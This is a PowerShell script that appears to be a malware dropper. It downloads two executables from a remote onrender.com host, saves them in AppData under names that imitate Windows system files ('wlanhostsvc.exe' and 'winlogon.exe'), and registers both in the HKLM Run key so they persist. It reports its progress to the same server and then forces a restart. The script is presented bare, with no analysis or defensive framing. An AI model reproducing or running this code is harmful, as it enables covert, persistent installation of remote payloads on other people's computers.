$ErrorActionPreference = 'SilentlyContinue'

function Hit {
    param([string]$url, [object]$data = $null)
    try {
        if ($data) {
            Invoke-RestMethod -Uri $url -Method Post -Body ($data | ConvertTo-Json -Depth 10) -ContentType 'application/json'
        } else {
            Invoke-WebRequest -Uri $url -UseBasicParsing
        }
    } catch {
        return 'none'
    }
}

function Log {
    param([string]$statement, [string]$state = 'SUCCESS', [bool]$terminal = $false)
    try {
        $full = "$state   $statement"
        if ($terminal) {
            Hit "$global:url/terminal" -data @{ output = $full }
        }
        Hit "$global:url/output" -data @{ user = $global:user; err = $full }
    } catch {}
}

$global:url = 'https://ms32-sha2.onrender.com'
$global:user = '<MIG>'

$regpath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
$appdata_path = "$env:APPDATA\Microsoft\Network"
$destination_path_exe = "$appdata_path\wlanhostsvc.exe"
$dest_checker = "$appdata_path\winlogon.exe"

$ms32done = $false
$checkerdone = $false
$regdone = $false

New-Item -ItemType Directory -Force -Path $appdata_path | Out-Null

# Ensure wget is available
if (-not (Get-Command 'wget' -ErrorAction SilentlyContinue)) {
    try {
        Start-Process 'winget' -ArgumentList 'install wget' -Wait
    } catch {
        Invoke-WebRequest -Uri 'https://eternallybored.org/misc/wget/current/wget.exe' -OutFile "$env:WINDIR\System32\wget.exe"
    }
}

# Download and set registry entries
try {
    Invoke-WebRequest -Uri "$url/static/apps/wlanhostsvc.exe" -OutFile $destination_path_exe -UseBasicParsing
    $ms32done = $true
    if (-not (Test-Path $destination_path_exe)) {
        Log "Incorrect url $url for wlanhostsvc.exe" -state 'FATAL'
        exit
    }

    Invoke-WebRequest -Uri "$url/static/apps/winlogon.exe" -OutFile $dest_checker -UseBasicParsing
    $checkerdone = $true
    if (-not (Test-Path $dest_checker)) {
        Log "Incorrect url $url for winlogon.exe" -state 'FATAL'
        exit
    }

    Set-ItemProperty -Path $regpath -Name 'Wlanhostsvc' -Value $destination_path_exe
    Set-ItemProperty -Path $regpath -Name 'winlogon' -Value $dest_checker
    $regdone = $true
} catch {
    $err = $_.Exception.Message
    Log "migration not done. error=$err `t ms32done=$ms32done,checkerdone=$checkerdone,regdone=$regdone" -state 'FATAL'
    exit
}

Log 'Migration complete ab smartboard ki mkc'
Restart-Computer -Force
